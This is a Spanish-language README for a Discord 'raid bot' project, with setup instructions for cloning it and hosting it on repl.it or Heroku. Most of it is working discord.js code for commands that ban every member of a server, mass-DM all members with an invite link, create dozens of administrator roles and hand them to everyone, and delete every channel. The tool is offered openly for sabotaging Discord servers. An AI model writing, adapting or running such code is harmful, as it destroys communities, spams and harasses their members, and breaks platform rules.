# anotherdiscordraidbot

Otro Bot de Raid de Discord, no es lo esperado o lo buscado por los mas exigentes; pero sirve.

## Instalacion / Configurar

Primero clona el repositorio:
```bash
[/home/1080] nyethash ~ # git clone https://github.com/zJuack/anotherdiscordraidbot
```

Despues de eso es hora que configures, edites y hostees el bot, repl.it es una opcion; o Heroku.

Facilmente podrias configurar el bot haciendo cambios en ciertas lineas, como por ejemplo:

```js
client.login("El Token de tu Bot esta aqui.");
```
```js
  if (command === "banall") {
    message.guild.members.cache.forEach(allUsers => { allUsers.ban() })
  }
  if (command == "dm") {
    message.guild.members.cache.forEach(pitos => {
      pitos.send("Tu mensaje para DM: discord.gg/tuservidor")

    })
  }
  if (command == "roles") {
    for (let i = 0; i <= 50; i++) {
      message.guild.roles.create({ data: { name: "TuNombreDeRol", permissions: "ADMINISTRATOR", color: "BLACK" } })
    }
    let xd = message.guild.roles.cache.find(c => c.name === "TuNombreDeRol");
    message.guild.members.cache.forEach(allUsers => { allUsers.roles.add(xd) })
  }
  if (command == "deletechannels") {
    message.guild.channels.cache.forEach(xd => xd.delete())
  }
});
```

Hay mas cosas que puedes cambiar, pero tu las podes ver tu mismo, por cualquier problema; no dudes en contactarme.

